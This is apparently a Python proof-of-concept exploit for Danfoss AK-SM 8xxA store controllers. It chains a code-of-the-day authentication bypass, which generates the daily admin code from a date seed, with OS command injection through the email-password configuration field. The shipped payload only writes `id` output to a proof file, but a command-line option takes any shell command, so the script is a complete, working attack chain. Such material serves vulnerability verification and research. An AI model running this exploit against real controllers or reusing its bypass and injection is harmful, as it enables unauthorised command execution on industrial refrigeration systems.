#!/usr/bin/env python3
"""
PoC: CVE-2025-41451 - Danfoss AK-SM 8xxA post-auth OS command injection
via alarm-to-mail (SMTP email) configuration fields.

The email authentication password (config item 0x1be1) is interpolated into
an OS shell command without sanitization on firmware < 4.3.1. This PoC
authenticates (by default via the CVE-2025-41450 code-of-the-day bypass,
chaining the two issues as a real attack would), then saves an email
config whose password field carries a shell payload.

The payload is a benign proof marker: it runs `id` and writes the output to
captures/rce_proof_41451.txt on the target (emulator) host.

Usage: cve_2025_41451_alarm_mail_cmd_injection.py [--target HOST:PORT]
       [--user admin --password PW] [--payload SHELL]
Exit 0 = injection request accepted (see proof file), 1 = failed.
"""

import argparse
import hashlib
import re
import sys
import urllib.parse
import urllib.request
from datetime import datetime

DEFAULT_PAYLOAD = "x'; id > captures/rce_proof_41451.txt #"


def generate_code(day: datetime) -> str:
    seed = f"AKSM-COTD-{day.year:04d}-{day.month:02d}-{day.day:02d}"
    return f"{int(hashlib.md5(seed.encode()).hexdigest(), 16) % 900000 + 100000}"


def post(base: str, action: str, fields: dict, session: str = None, xml: bool = False):
    url = f"{base}/xml.cgi?action={action}"
    if xml:
        body = ("<?xml version=\"1.0\"?><request>" +
                "".join(f"<{k}>{v}</{k}>" for k, v in fields.items()) + "</request>").encode()
        ctype = "text/xml"
    else:
        body = urllib.parse.urlencode(fields).encode()
        ctype = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers={"Content-Type": ctype})
    if session:
        req.add_header("Cookie", f"SMSession={session}")
    print(f"--> POST {url}")
    print(f"    {body.decode(errors='replace')}")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = resp.read()
        cookie = resp.headers.get("Set-Cookie", "")
    print(f"<-- {resp.status} {data.decode(errors='replace').strip()}")
    return data, cookie


def cotd_session(base: str) -> str:
    code = generate_code(datetime.now())
    data, cookie = post(base, "getauth",
                        {"username": "admin", "password": code, "codeofday": "1"},
                        xml=True)
    if b"<result>ok</result>" in data and "SMSession=" in cookie:
        return cookie.split("SMSession=")[1].split(";")[0]
    return None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:8080")
    ap.add_argument("--user", default=None, help="use configured creds instead of CotD bypass")
    ap.add_argument("--password", default=None)
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    args = ap.parse_args()
    base = f"http://{args.target}"

    if args.user:
        print("[*] step 1: authenticating with configured credentials")
        data, cookie = post(base, "getauth",
                            {"username": args.user, "password": args.password}, xml=True)
        session = cookie.split("SMSession=")[1].split(";")[0] if "SMSession=" in cookie else None
    else:
        print("[*] step 1: authenticating via CVE-2025-41450 code-of-the-day (chained)")
        session = cotd_session(base)
    if not session:
        print("[-] authentication failed; cannot reach the vulnerable handler")
        return 1
    print(f"[+] authenticated, session: {session}")

    print("[*] step 2: saving alarm-to-mail config with injection in item 0x1be1")
    print(f"[*] payload: {args.payload}")
    data, _ = post(base, "set_email_config", {
        "smtp_server": "smtp.attacker.example",
        "smtp_port": "25",
        "smtp_user": "alerts@store.example",
        "item_0x1be1": args.payload,  # email auth password - unsanitized shell sink
        "from_addr": "aksm@store.example",
        "alarm_to_mail_enabled": "1",
    }, session=session)

    if b"<result>ok</result>" not in data:
        print("[-] config save rejected")
        return 1

    print("[+] config accepted by target. If vulnerable, the payload executed")
    print("    as the web service user during config save.")
    print("[*] proof: on the target host check captures/rce_proof_41451.txt")
    return 0


if __name__ == "__main__":
    sys.exit(main())
